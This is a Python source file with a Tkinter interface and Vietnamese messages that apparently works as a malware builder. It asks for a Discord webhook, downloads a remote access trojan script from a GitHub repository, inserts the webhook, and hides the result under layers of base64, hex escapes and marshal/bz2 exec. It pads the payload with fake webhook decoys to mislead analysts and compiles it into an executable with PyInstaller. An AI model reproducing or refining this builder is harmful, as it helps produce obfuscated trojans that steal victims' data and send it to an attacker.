import tkinter as tk
from tkinter import messagebox
import requests
import subprocess
import os
import base64
import marshal
import bz2
import random
import string

def generate_fake_webhooks(writed):
    junkcode = ""
    hooksname = (
        ["real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
        if writed else
        ["wbh", "real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
    )
    hookstype = [
        "https://discord.com/api/webhooks/",
        "https://discordapp.com/api/webhooks/",
        "https://ptb.discord.com/api/webhooks/",
        "https://canary.discord.com/api/webhooks/"
    ]
    hookslength = [68, 67, 66, 65]
    lastpart = "-"
    lstpart = "_"

    for _ in range(125):
        hook_name = random.choice(hooksname)
        hook_type = random.choice(hookstype)
        hook_length = random.choice(hookslength)
        random_digits = ''.join(random.choice(string.digits) for _ in range(18))
        random_suffix = ''.join(random.choice(string.ascii_letters + string.digits + lastpart + lstpart) for _ in range(hook_length))
        
        hook = f"{hook_name} = '{hook_type}1{random_digits}/{random_suffix}'"
        junkcode += f"{hook}\n"
    
    return junkcode

def is_python_installed():
    try:
        subprocess.run(["python", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def download_and_install_python():
    python_installer_url = "https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe"
    installer_path = "python_installer.exe"
    response = requests.get(python_installer_url, stream=True)
    with open(installer_path, "wb") as file:
        file.write(response.content)
    subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)

def install_pyinstaller():
    subprocess.run(["python", "-m", "pip", "install", "pyinstaller"], check=True)

def obfuscate_code(content):
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    OFFSET = 10
    VARIABLE_NAME = "___" * 1000
    code = f'{VARIABLE_NAME} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) + 1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + byte
        code += f'{VARIABLE_NAME} += "{_str}"\n'
        index += OFFSET
    code += f'exec(__import__("base64").b64decode({VARIABLE_NAME}.encode("utf-8")).decode("utf-8"))'
    return generate_fake_webhooks(True) + encrypt_code(code) + generate_fake_webhooks(True)

def encrypt_code(codee):
    compiled_code = compile(codee, '<string>', 'exec')
    compressed_code = bz2.compress(marshal.dumps(compiled_code))
    compressed_code_str = repr(compressed_code)
    return f"import os\nimport base64\nexec(__import__('marshal').loads(__import__('bz2').decompress({compressed_code_str})))"

def obfuscate_and_convert():
    if not is_python_installed():
        messagebox.showinfo("Cài đặt Python", "Đang tải và cài đặt Python...")
        download_and_install_python()
        # Cài đặt pyinstaller sau khi cài đặt Python
        install_pyinstaller()
        messagebox.showinfo("Cài đặt hoàn tất", "Cài đặt Python và pyinstaller đã hoàn tất. Vui lòng khởi động lại ứng dụng.")
        return

    try:
        install_pyinstaller()
    except subprocess.CalledProcessError:
        messagebox.showerror("Lỗi", "Không thể cài đặt pyinstaller.")
        return

    webhook = entry.get()
    if not webhook:
        messagebox.showerror("Lỗi", "Vui lòng nhập webhook!")
        return

    url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/mainmini.py"
    response = requests.get(url)
    if response.status_code != 200:
        messagebox.showerror("Lỗi", "Không thể tải nội dung từ URL.")
        return

    script_content = response.text.replace('you_webhook', webhook)
    obfuscated_code = obfuscate_code(script_content)

    temp_script_path = "mainmini_obfuscated.py"
    with open(temp_script_path, "w") as file:
        file.write(obfuscated_code)

    setup_script = f"""
from PyInstaller.__main__ import run

run([
    '--name=ObfuscatedApp',
    '--onefile',
    '{temp_script_path}'
])
    """
    with open("setup.py", "w") as file:
        file.write(setup_script)

    subprocess.run(["python", "setup.py"])

    messagebox.showinfo("Hoàn thành", "Quá trình tạo file .exe hoàn tất!")

root = tk.Tk()
root.title("Webhook Input")

tk.Label(root, text="Nhập webhook:").pack(pady=10)
entry = tk.Entry(root, width=50)
entry.pack(pady=5)

tk.Button(root, text="Thực hiện", command=obfuscate_and_convert).pack(pady=20)

root.mainloop()
